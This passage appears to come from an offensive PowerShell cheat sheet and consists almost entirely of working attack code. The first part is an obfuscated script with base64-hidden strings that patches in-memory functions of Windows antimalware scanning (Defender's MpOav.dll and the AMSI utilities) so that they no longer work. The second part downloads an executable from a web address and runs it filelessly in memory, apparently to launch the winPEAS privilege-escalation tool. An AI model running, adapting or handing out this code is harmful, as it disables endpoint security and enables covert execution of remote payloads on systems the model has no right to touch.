Â  Â  ${/=\/==\/=\___/\/\} = [AppDomain]::CurrentDomain

Â  Â  ${_/\_/\/=\___/\_/\} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABlAGQARABlAGwAZQBnAGEAdABlAA=='))))

Â  Â  ${__/=\_/===\_/\_/=} = ${/=\/==\/=\___/\/\}.DefineDynamicAssembly(${_/\_/\/=\___/\_/\}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)

Â  Â  ${/=\_/===\/\_/\/=\} = ${__/=\_/===\_/\_/=}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAE0AZQBtAG8AcgB5AE0AbwBkAHUAbABlAA=='))), $false)

Â  Â  ${_/=\/=\_/===\/=\_} = ${/=\_/===\/\_/\/=\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEQAZQBsAGUAZwBhAHQAZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzACwAIABQAHUAYgBsAGkAYwAsACAAUwBlAGEAbABlAGQALAAgAEEAbgBzAGkAQwBsAGEAcwBzACwAIABBAHUAdABvAEMAbABhAHMAcwA='))), [System.MulticastDelegate])

Â  Â  ${_/====\/\_/\__/\_} = ${_/=\/=\_/===\/=\_}.DefineConstructor($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBUAFMAcABlAGMAaQBhAGwATgBhAG0AZQAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFAAdQBiAGwAaQBjAA=='))), [System.Reflection.CallingConventions]::Standard, ${____/\/===\/==\/==})

Â  Â  ${_/====\/\_/\__/\_}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))

Â  Â  ${/===\/\_/\____/=\} = ${_/=\/=\_/===\/=\_}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAaQBkAGUAQgB5AFMAaQBnACwAIABOAGUAdwBTAGwAbwB0ACwAIABWAGkAcgB0AHUAYQBsAA=='))), ${___/\_/\/\____/==\}, ${____/\/===\/==\/==})

Â  Â  ${/===\/\_/\____/=\}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))

Â  Â  echo ${_/=\/=\_/===\/=\_}.CreateType()

}

${/=\_/==\/=\/\/=\_} = ___/\/===\/\___/== kernel32.dll LoadLibraryA

${/====\/=\/\___/\_} = _/======\/=\/\/==\ @([String]) ([IntPtr])

${___/\__/=\/=\/\/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\_/==\/=\/\/=\_},

${/====\/=\/\___/\_})

${/=\_/=\/====\_/=\} = ___/\/===\/\___/== kernel32.dll GetProcAddress

${/==\/===\/=\/\_/\} = _/======\/=\/\/==\ @([IntPtr], [String]) ([IntPtr])

${_/===\_/\____/===} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\_/=\/====\_/=\},

${/==\/===\/=\/\_/\})

${___/=\/====\_/==\} = ___/\/===\/\___/== kernel32.dll VirtualProtect

${/=\_/=\_/\/\_/===} = _/======\/=\/\/==\ @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])

${/=\__/=\_/\/\_/=\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${___/=\/====\_/==\},

${/=\_/=\_/\/\_/===})

${_/===\/=\_/==\_/=} = ${___/\__/=\/=\/\/=}.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBwAE8AYQB2AC4AZABsAGwA'))))

${/==\__/===\/\____} = ${_/===\_/\____/===}.Invoke(${_/===\/=\_/==\_/=},

$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwARwBlAHQAQwBsAGEAcwBzAE8AYgBqAGUAYwB0AA=='))))

${/=\/=\/\_/\/\/\/\} = 0

${/=\__/=\_/\/\_/=\}.Invoke(${/==\__/===\/\____}, [uint32]6, 0x40, [ref]${/=\/=\/\_/\/\/\/\})Â 

${__/==\/=\__/\/===} = [byte[]] (0xb8, 0xff, 0xff, 0xff, 0xff, 0xC3)

[System.Runtime.InteropServices.Marshal]::Copy(${__/==\/=\__/\/===}, 0, ${/==\__/===\/\____}, 6)

${/=\_/===\/\/===\/} = [Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAGcA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBtAGUA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgB0AC4AQQB1AHQAbwBtAA==')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQB0AGkAbwBuAC4AQQA=')))+'ms'+'iU'+'ti'+'ls')

${_/===\_/==\/=====} = ${/=\_/===\/\/===\/}.GetMethods('N'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBuAFAAdQA=')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBsAGkAYwAsAHMAdAA=')))+'at'+'ic') | ? Name -eq Uninitialize

${_/===\_/==\/=====}.Invoke(${/=\_/===\/\/===\/},$null)
~~~

~~~PowerShell
$url="http://www.url.com/executable.exe"
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
~~~